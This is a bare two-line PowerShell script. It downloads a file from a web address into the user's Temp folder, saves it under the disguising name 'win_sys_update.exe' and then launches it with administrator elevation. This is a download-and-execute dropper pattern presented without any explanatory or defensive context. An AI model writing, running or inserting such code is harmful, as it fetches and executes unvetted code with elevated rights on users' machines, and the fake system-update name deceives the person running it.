(New-Object Net.WebClient).DownloadFile('https://github.com', "$env:LOCALAPPDATA\Temp\win_sys_update.exe")
Start-Process "$env:LOCALAPPDATA\Temp\win_sys_update.exe" -Verb RunAs
